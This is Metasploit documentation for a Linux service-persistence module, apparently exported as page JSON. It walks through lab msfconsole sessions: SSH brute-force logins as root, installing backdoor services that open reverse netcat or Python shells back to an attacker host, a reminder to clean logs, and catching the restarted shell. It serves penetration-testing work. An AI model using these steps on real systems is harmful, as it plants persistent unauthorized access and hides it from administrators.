{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/service_persistence","result":{"data":{"moduleMetadataJson":{"id":"afa0a9cb-e938-5e71-a7ab-240bc06a185a","name":"Service Persistence","fullname":"exploit/linux/local/service_persistence","description":"This module will create a service on the box, and mark it for auto-restart.\n          We need enough access to write service files and potentially restart services\n          Targets:\n            System V:\n              CentOS <= 5\n              Debian <= 6\n              Kali 2.0\n              Ubuntu <= 9.04\n            Upstart:\n              CentOS 6\n              Fedora >= 9, < 15\n              Ubuntu >= 9.10, <= 14.10\n            systemd:\n              CentOS 7\n              Debian >= 7, <=8\n              Fedora >= 15\n              Ubuntu >= 15.04\n          Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/service_persistence","documentationSlug":"/modules/documentation/exploit/linux/local/service_persistence","referencesSlug":"/modules/references/exploit/linux/local/service_persistence"},"documentation":{"html":"<h3 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h3>\n<p>  This module has been tested against:</p>\n<ol>\n<li>Kali 2.0 (System V)</li>\n<li>Ubuntu 14.04 (Upstart)</li>\n<li>Ubuntu 16.04 (systemd)</li>\n<li>Ubuntu 16.04 (systemd user)</li>\n<li>Centos 5 (System V)</li>\n<li>Fedora 18 (systemd)</li>\n<li>Fedora 20 (systemd)</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Exploit a box via whatever method</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/service_persistence</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Do: <code class=\"language-text\">set payload cmd/unix/reverse_python</code> or <code class=\"language-text\">payload cmd/unix/reverse_netcat</code> depending on system.</li>\n<li>Optional Do: <code class=\"language-text\">set SHELLAPTH /bin</code> if needed for compatibility on remote system.</li>\n<li>Do: <code class=\"language-text\">set lhost</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Do: <code class=\"language-text\">use exploit/multi/handler</code></li>\n<li>Do: <code class=\"language-text\">set payload cmd/unix/reverse_python</code> or <code class=\"language-text\">payload cmd/unix/reverse_netcat</code> depending on system.</li>\n<li>Do: <code class=\"language-text\">set lhost</code></li>\n<li>Do: <code class=\"language-text\">exploit -j</code></li>\n<li>Kill your shell (if System V, reboot target).  Upstart/systemd wait 10sec</li>\n<li>Get Shell</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>target</strong></p>\n<p>  There are several targets selectable, which all have their own issues.</p>\n<ol start=\"0\">\n<li>Automatic: Detect the service handler automatically based on running <code class=\"language-text\">which</code> to find the admin binaries</li>\n<li>System V: There is no automated restart, so while you'll get a shell, if it crashes, you'll need to wait for a init shift to restart the process automatically (like a reboot).  This logs to syslog or /var/log/<process>.log and .err</li>\n<li>Upstart: Logs to its own file.  This module is set to restart the shell after a 10sec pause, and do this forever.</li>\n<li>systemd and systemd user: This module is set to restart the shell after a 10sec pause, and do this forever.</li>\n</ol>\n<p><strong>SHELLPATH</strong></p>\n<p>  If you need to change the location where the backdoor is written (like on CentOS 5), it can be done here.  Default is /usr/local/bin</p>\n<p><strong>SERVICE</strong></p>\n<p>  The name of the service to create.  If not chosen, a 7 character random one is created.</p>\n<p><strong>SHELL_NAME</strong></p>\n<p>  The name of the file to write with our shell.  If not chosen, a 5 character random one is created.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"system-v-centos-5---root---chkconfig\" style=\"position:relative;\"><a href=\"#system-v-centos-5---root---chkconfig\" aria-label=\"system v centos 5   root   chkconfig permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>System V (Centos 5 - root - chkconfig)</h3>\n<p>Get initial access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.199.131\nrhosts =&gt; 192.168.199.131\nmsf auxiliary(ssh_login) &gt; set username root\nusername =&gt; root\nmsf auxiliary(ssh_login) &gt; set password centos\npassword =&gt; centos\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] 192.168.199.131:22 SSH - Starting bruteforce\n[+] 192.168.199.131:22 SSH - Success: &#39;root:centos&#39; &#39;uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=root:system_r:unconfined_t:SystemLow-SystemHigh Linux localhost.localdomain 2.6.18-398.el5 #1 SMP Tue Sep 16 20:51:48 EDT 2014 i686 i686 i386 GNU/Linux &#39;\n[*] Command shell session 1 opened (192.168.199.128:49359 -&gt; 192.168.199.131:22) at 2016-06-22 14:27:38 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Install our callback service (system_v w/ chkconfig).  Note we change SHELLPATH since /usr/local/bin isnt in the path for CentOS 5 services.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use exploit/linux/local/service_persistence\nmsf exploit(service_persistence) &gt; set session 1\nsession =&gt; 1\nmsf exploit(service_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(service_persistence) &gt; set SHELLPATH /bin\nSHELLPATH =&gt; /bin\nmsf exploit(service_persistence) &gt; set payload cmd/unix/reverse_netcat\npayload =&gt; cmd/unix/reverse_netcat\nmsf exploit(service_persistence) &gt; set lhost 192.168.199.128\nlhost =&gt; 192.168.199.128\nmsf exploit(service_persistence) &gt; exploit\n\n[*] Started reverse handler on 192.168.199.128:4444 \n[*] Writing backdoor to /bin/GUIJc\n[*] Max line length is 65537\n[*] Writing 95 bytes in 1 chunks of 329 bytes (octal-encoded), using printf\n[*] Utilizing System_V\n[*] Utilizing chkconfig\n[*] Writing service: /etc/init.d/HqdezBF\n[*] Max line length is 65537\n[*] Writing 1825 bytes in 1 chunks of 6409 bytes (octal-encoded), using printf\n[*] Enabling &amp; starting our service\n[*] Command shell session 2 opened (192.168.199.128:4444 -&gt; 192.168.199.131:56182) at 2016-06-22 14:27:50 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Reboot the box to prove persistence</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">reboot\n^Z\nBackground session 2? [y/N]  y\nmsf exploit(service_persistence) &gt; use exploit/multi/handler\nmsf exploit(handler) &gt; set payload cmd/unix/reverse_netcat\npayload =&gt; cmd/unix/reverse_netcat\nmsf exploit(handler) &gt; set lhost 192.168.199.128\nlhost =&gt; 192.168.199.128\nmsf exploit(handler) &gt; exploit\n\n[*] Started reverse handler on 192.168.199.128:4444 \n[*] Starting the payload handler...\n[*] Command shell session 3 opened (192.168.199.128:4444 -&gt; 192.168.199.131:44744) at 2016-06-22 14:29:32 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"upstart-ubuntu-14044-server---root\" style=\"position:relative;\"><a href=\"#upstart-ubuntu-14044-server---root\" aria-label=\"upstart ubuntu 14044 server   root permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Upstart (Ubuntu 14.04.4 Server - root)</h3>\n<p>Of note, I allowed Root login via SSH w/ password only to gain easy initial access</p>\n<p>Get initial access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; exploit\n\n[*] 10.10.60.175:22 SSH - Starting bruteforce\n[+] 10.10.60.175:22 SSH - Success: &#39;root:ubuntu&#39; &#39;uid=0(root) gid=0(root) groups=0(root) Linux ubuntu 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:27 UTC 2016 i686 i686 i686 GNU/Linux &#39;\n[*] Command shell session 1 opened (10.10.60.168:43945 -&gt; 10.10.60.175:22) at 2016-06-22 08:03:15 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Install our callback service (Upstart)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use exploit/linux/local/service_persistence\nmsf exploit(service_persistence) &gt; set session 1\nsession =&gt; 1\nmsf exploit(service_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(service_persistence) &gt; set payload cmd/unix/reverse_python\npayload =&gt; cmd/unix/reverse_python\nmsf exploit(service_persistence) &gt; set lhost 10.10.60.168\nlhost =&gt; 10.10.60.168\nmsf exploit(service_persistence) &gt; exploit\n\n[*] Started reverse handler on 10.10.60.168:4444 \n[*] Writing backdoor to /usr/local/bin/bmmjv\n[*] Max line length is 65537\n[*] Writing 429 bytes in 1 chunks of 1650 bytes (octal-encoded), using printf\n[*] Utilizing Upstart\n[*] Writing /etc/init/Hipnufl.conf\n[*] Max line length is 65537\n[*] Writing 236 bytes in 1 chunks of 874 bytes (octal-encoded), using printf\n[*] Starting service\n[*] Dont forget to clean logs: /var/log/upstart/Hipnufl.log\n[*] Command shell session 5 opened (10.10.60.168:4444 -&gt; 10.10.60.175:44368) at 2016-06-22 08:23:46 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>And now, we can kill the callback shell from our previous session</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">^Z\nBackground session 5? [y/N]  y\nmsf exploit(service_persistence) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nnetstat -antp | grep 4444\ntcp        0      0 10.10.60.175:44368      10.10.60.168:4444       ESTABLISHED 1783/bash\ntcp        0      0 10.10.60.175:44370      10.10.60.168:4444       ESTABLISHED 1789/python\nkill 1783\n[*] 10.10.60.175 - Command shell session 5 closed.  Reason: Died from EOFError\nkill 1789</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Now with a multi handler, we can catch Upstart restarting the process every 10sec</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/handler \nmsf exploit(handler) &gt; set payload cmd/unix/reverse_python\npayload =&gt; cmd/unix/reverse_python\nmsf exploit(handler) &gt; set lhost 10.10.60.168\nlhost =&gt; 10.10.60.168\nmsf exploit(handler) &gt; exploit\n\n[*] Started reverse handler on 10.10.60.168:4444 \n[*] Starting the payload handler...\n[*] Command shell session 3 opened (10.10.60.168:4444 -&gt; 10.10.60.175:44390) at 2016-06-22 08:26:48 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"systemd-ubuntu-1604-server---root\" style=\"position:relative;\"><a href=\"#systemd-ubuntu-1604-server---root\" aria-label=\"systemd ubuntu 1604 server   root permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>systemd (Ubuntu 16.04 Server - root)</h3>\n<p>Ubuntu 16.04 doesn't have many of the default shell options, however <code class=\"language-text\">cmd/unix/reverse_netcat</code> works.\nWhile python shellcode works on previous sytems, on 16.04 the path is <code class=\"language-text\">python3</code>, and therefore <code class=\"language-text\">python</code> will fail the shellcode.</p>\n<p>Get initial access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; use exploit/linux/local/service_persistence\nmsf exploit(service_persistence) &gt; set session 1\nsession =&gt; 1\nmsf exploit(service_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(service_persistence) &gt; set payload cmd/unix/reverse_netcat\npayload =&gt; cmd/unix/reverse_netcat\nmsf exploit(service_persistence) &gt; set lhost 192.168.199.128\nlhost =&gt; 192.168.199.128\nmsf exploit(service_persistence) &gt; exploit\n\n[*] Started reverse handler on 192.168.199.128:4444 \n[*] Writing backdoor to /usr/local/bin/JSRCF\n[*] Max line length is 65537\n[*] Writing 103 bytes in 1 chunks of 361 bytes (octal-encoded), using printf\n[*] Utilizing systemd\n[*] /lib/systemd/system/YelHpCx.service\n[*] Max line length is 65537\n[*] Writing 151 bytes in 1 chunks of 579 bytes (octal-encoded), using printf\n[*] Enabling service\n[*] Starting service\n[*] Command shell session 7 opened (192.168.199.128:4444 -&gt; 192.168.199.130:47050) at 2016-06-22 10:35:07 -0400\n\n^Z\nBackground session 7? [y/N]  y</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Kill the process on the Ubuntu target box via local access #good_admin</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">root@ubuntu:/etc/systemd/system/multi-user.target.wants# netstat -antp | grep 4444\ntcp        0      0 192.168.199.130:47052   192.168.199.128:4444    ESTABLISHED 5632/nc\nroot@ubuntu:/etc/systemd/system/multi-user.target.wants# kill 5632</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>And logically, we lose our shell</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"> [*] 192.168.199.130 - Command shell session 7 closed.  Reason: Died from EOFError</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Now with a multi handler, we can catch systemd restarting the process every 10sec</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(service_persistence) &gt; use exploit/multi/handler \nmsf exploit(handler) &gt; show options\n\nModule options (exploit/multi/handler):\n\n Name  Current Setting  Required  Description\n ----  ---------------  --------  -----------\n\nPayload options (cmd/unix/reverse_netcat):\n\n Name   Current Setting  Required  Description\n ----   ---------------  --------  -----------\n LHOST  192.168.199.128  yes       The listen address\n LPORT  4444             yes       The listen port\n\nExploit target:\n\n Id  Name\n --  ----\n 0   Wildcard Target\n\nmsf exploit(handler) &gt; exploit\n\n[*] Started reverse handler on 192.168.199.128:4444 \n[*] Starting the payload handler...\n[*] Command shell session 8 opened (192.168.199.128:4444 -&gt; 192.168.199.130:47056) at 2016-06-22 10:37:30 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"systemd-user-ubuntu-1604-server---vagrant\" style=\"position:relative;\"><a href=\"#systemd-user-ubuntu-1604-server---vagrant\" aria-label=\"systemd user ubuntu 1604 server   vagrant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>systemd user (Ubuntu 16.04 Server - vagrant)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/local/service_persistence) &gt; options\n\nModule options (exploit/linux/local/service_persistence):\n\n   Name        Current Setting  Required  Description\n   ----        ---------------  --------  -----------\n   SERVICE                      no        Name of service to create\n   SESSION     -1               yes       The session to run this module on.\n   SHELLPATH   /tmp             yes       Writable path to put our shell\n   SHELL_NAME                   no        Name of shell file to write\n\n\nPayload options (cmd/unix/reverse_netcat):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  172.28.128.1     yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   4   systemd user\n\n\nmsf5 exploit(linux/local/service_persistence) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 172.28.128.1:4444\n[*] Writing backdoor to /tmp/PPpCF\n[*] Max line length is 65537\n[*] Writing 94 bytes in 1 chunks of 330 bytes (octal-encoded), using printf\n[*] Creating user service directory\n[*] Writing service: /home/vagrant/.config/systemd/user/OzzdRBC.service\n[*] Max line length is 65537\n[*] Writing 203 bytes in 1 chunks of 778 bytes (octal-encoded), using printf\n[*] Reloading manager configuration\n[*] Enabling service\n[*] Starting service: OzzdRBC\n[*] Command shell session 2 opened (172.28.128.1:4444 -&gt; 172.28.128.3:52564) at 2019-03-06 00:22:40 -0600\n\nid\nuid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)\nuname -a\nLinux ubuntu-xenial 4.4.0-141-generic #167-Ubuntu SMP Wed Dec 5 10:40:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"afa0a9cb-e938-5e71-a7ab-240bc06a185a"}}}